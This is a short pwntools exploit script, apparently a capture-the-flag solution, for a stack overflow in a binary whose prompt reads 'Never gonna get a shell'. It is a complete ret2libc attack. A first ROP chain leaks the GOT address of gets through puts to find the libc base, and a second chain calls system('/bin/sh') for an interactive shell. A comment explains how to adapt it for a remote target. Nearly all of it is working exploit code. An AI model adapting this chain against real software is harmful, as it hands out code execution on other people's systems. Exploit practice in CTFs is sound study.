from pwn import *

binary = args.BIN
e = context.binary = ELF(binary, checksec=False)
r = ROP(e)

# note: for remote chal take addresses of puts/gets/system, put in a libc database
# libc = ELF('./libc6_2.36-0ubuntu4_amd64.so', checksec=False)

libc = e.libc

p = process(e.path)

chain = cyclic(16)
chain += p64(r.find_gadget(['pop rdi', 'ret'])[0])
chain += p64(e.got['gets'])
chain += p64(e.plt['puts'])
chain += p64(e.sym['main']) # back to main with obtained leak

p.sendlineafter(b'Never gonna get a shell >>> \n', chain)

pause() # wait for leak

leak = u64(p.recv(6).ljust(8, b'\x00'))

libc.address = leak-libc.sym['gets']

info(f"GOT[gets] = {hex(e.got['gets'])}")
info(f"PLT[puts] = {hex(e.plt['puts'])}")
info(f"LIBC BASE = PLT[puts] - GOT[gets] = ({(hex(libc.address))})")

pause() # wait for back to main

chain = cyclic(16)
chain += p64(r.find_gadget(['ret'])[0])
chain += p64(r.find_gadget(['pop rdi', 'ret'])[0])
chain += p64(next(libc.search(b'/bin/sh')))
chain += p64(libc.sym['system'])

p.sendlineafter(b'Never gonna get a shell >>> \n', chain)

p.interactive()

